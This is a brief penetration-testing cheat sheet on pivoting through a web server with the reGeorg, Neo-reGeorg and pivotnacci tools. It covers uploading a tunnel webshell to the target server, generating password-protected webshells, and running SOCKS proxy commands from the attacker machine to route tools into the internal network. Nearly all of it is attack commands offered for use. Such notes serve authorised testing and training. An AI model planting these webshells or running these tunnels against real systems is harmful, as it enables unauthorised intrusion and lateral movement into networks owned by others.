# Webshell Pivot

## Tools: reGeorg / Neo-reGeorg / pivotnacci

Links: https://github.com/sensepost/reGeorg https://github.com/L-codes/Neo-reGeorg https://github.com/blackarrowsec/pivotnacci

## TIP: reGeorg is only compatible with Python 2.7, Neo-reGeorg with Python 2 and Python3

### 1) On the pivot machine, upload tunnel.(aspx|ashx|jsp|php) to the web server, like a WebShell.

### 2) On the attacker machine, open the tunnel

    python2 reGeorgSocksProxy.py -p 1080 -u https://$PIVOT:443/XXX/tunnel.jsp

#### To bypass socket issues, use the nosocket tunnel version:

    python2 reGeorgSocksProxy.py -l 127.0.0.1 -p 1081 -u https://$PIVOT:443/XXX//tunnel.nosocket.php

Then, you can use all of your tools by specifying a proxy, for example with Proxychains.

With Neo-reGeorg, it is possible to generate a WebShell with password. Many other options are present, check the help.

##### Generate the WebShells with a password

    python3 neoreg.py generate -k pivotpassword

##### After uploading it, connect the attacker machine like this

    python3 neoreg.py -k pivotpassword -u https://$PIVOT:443/tunnel.js

And with pivotnacci, after droping the agent:

    pivotnacci https://$PIVOT/agent.php --password $PASSWORD
